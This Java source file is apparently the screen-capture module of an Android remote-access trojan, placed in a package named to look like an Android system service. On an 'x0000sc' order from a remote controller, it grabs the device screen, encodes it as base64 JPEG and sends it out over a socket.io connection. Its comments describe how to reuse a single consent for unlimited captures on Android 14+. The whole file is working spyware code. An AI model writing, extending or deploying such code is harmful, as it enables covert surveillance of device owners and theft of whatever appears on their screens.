package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.android.background.services.IOSocket;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * Screen capture via MediaProjection.
 *
 * Android 14+ only lets a MediaProjection create a single VirtualDisplay, and
 * the consent token is single-use. To support unlimited captures from one
 * consent, this class creates the VirtualDisplay ONCE (on first capture) and
 * keeps it alive; every {@code x0000sc} order just grabs the latest frame from
 * the still-running ImageReader instead of re-creating the display.
 *
 * Emits a base64 JPEG as an {@code x0000sc} event, or an explicit error
 * ({@code {"image":false,"error":"..."}}) when capture is impossible — no
 * silent no-ops.
 */
public class ScreenManager {

    private static final String TAG = "ScreenManager";

    // Static (process-wide) capture state. ConnectionManager creates a new
    // ScreenManager per order, but Android 14+ allows a MediaProjection to
    // create only ONE VirtualDisplay, so the display + reader must be created
    // once and shared across every x0000sc order.
    private static Context context;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static volatile boolean ready = false;

    public ScreenManager(Context context) {
        ScreenManager.context = context;
    }

    @SuppressLint("WrongConstant")
    public static synchronized void captureScreen(MediaProjection projection) {
        if (projection == null) {
            sendError("screen-capture consent not granted or projection unavailable");
            return;
        }
        try {
            if (!ready) {
                ensureCapture(projection);
            }
            if (!ready) {
                sendError("screen capture could not start");
                return;
            }
            // Grab the newest frame from the live virtual display. A freshly
            // created virtual display may not have produced its first frame
            // yet, so retry briefly before giving up.
            Image image = acquireImageWithRetry();
            if (image == null) {
                sendError("capture produced no image");
                return;
            }
            try {
                processImage(image);
            } finally {
                image.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "capture failed", e);
            sendError("capture failed: " + e.getMessage());
        }
    }

    private static Image acquireImageWithRetry() {
        Image image = imageReader.acquireLatestImage();
        for (int i = 0; i < 10 && image == null; i++) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                break;
            }
            image = imageReader.acquireLatestImage();
        }
        return image;
    }

    private static void ensureCapture(MediaProjection projection) throws Exception {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        windowManager.getDefaultDisplay().getRealMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3);
        // Android 14+ requires a MediaProjection.Callback to be registered
        // BEFORE createVirtualDisplay(), otherwise capture fails with
        // "Must register a callback before starting capture".
        projection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                teardown();
            }
        }, new Handler(Looper.getMainLooper()));

        virtualDisplay = projection.createVirtualDisplay("ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, new Handler(Looper.getMainLooper()));
        ready = true;
        Log.i(TAG, "virtual display ready: " + width + "x" + height);
    }

    private static void processImage(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();

            Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
            byte[] imageBytes = baos.toByteArray();
            String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("image", true);
            jsonObject.put("mime", "image/jpeg");
            jsonObject.put("bytes", imageBytes.length);
            jsonObject.put("base64", base64Image);
            IOSocket.getInstance().getIoSocket().emit("x0000sc", jsonObject);
            Log.i(TAG, "screen captured: " + imageBytes.length + " bytes");

            bitmap.recycle();
        } catch (Exception e) {
            Log.e(TAG, "processImage failed", e);
            sendError("process failed: " + e.getMessage());
        }
    }

    private static void sendError(String msg) {
        try {
            JSONObject object = new JSONObject();
            object.put("image", false);
            object.put("error", msg);
            IOSocket.getInstance().getIoSocket().emit("x0000sc", object);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.e(TAG, msg);
    }

    private static synchronized void teardown() {
        ready = false;
        if (virtualDisplay != null) {
            try {
                virtualDisplay.release();
            } catch (Exception ignored) {
            }
            virtualDisplay = null;
        }
        if (imageReader != null) {
            try {
                imageReader.close();
            } catch (Exception ignored) {
            }
            imageReader = null;
        }
    }
}
